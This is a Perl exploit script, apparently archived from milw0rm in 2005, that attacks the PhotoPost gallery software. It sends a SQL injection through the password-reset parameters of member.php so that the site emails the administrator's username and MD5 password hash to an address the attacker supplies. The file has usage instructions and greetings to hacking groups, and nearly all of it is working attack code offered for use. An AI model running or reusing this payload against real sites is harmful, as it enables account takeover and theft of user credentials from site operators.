#!/usr/bin/perl
# PhotoPost Arbitrary Data Exploit
# --------------------------------
# INFPG - Hacking&Security Research
#
#
# Use first the exploit code,then You'll get admin MD5 hash and user name on your mail.
#
# Greats: Infam0us Gr0up team/crew/fans,Zone-H,securiteam,str0ke-milw0rm,addict3d,
# Thomas-secunia,Yudha,Dcrab's,Kavling Community,1st Indonesian Security,
# Jasakom,ECHO,etc..betst reagrds t0 whell.
# Info: www.98.to/infamous
#

use IO::Socket;

if (@ARGV < 3)
{
system "clear";
print "PhotoPost Arbitrary Data Exploit\n";
print "\n-------------------------------\n";
print "\nINFGP-Hacking&Security Research\n";
print "\n\n";
print "[?]Usage: perl $0 [host] [path] [mail] \n";
exit(1);
}

system "clear";

$server = $ARGV[0];
$folder = @ARGV[1];
$mail = @ARGV[2];

print "Connecting to host ...\n";
$socket = IO::Socket::INET->new(
       Proto => "tcp",
       PeerAddr => "$ARGV[0]",
       PeerPort => "80"); unless ($socket)
{
 die "Server is offline\n"
}

print "[+]Connected\n\n";
print "[+]Building string core..\n";

$stringcore = 'member.php?ppaction=rpwd&verifykey=0&uid=0%20union%20select%20"0",$mail
,%20concat(username,"%20",%20password)%20from%20users';

print "Sent 0day..\n\n";
print $socket "GET /$folder/$stringcore HTTP/1.0\r\n\r\n";
print "Server Exploited\n";
print "You should check $mail now";
close($socket);

# milw0rm.com [2005-05-13]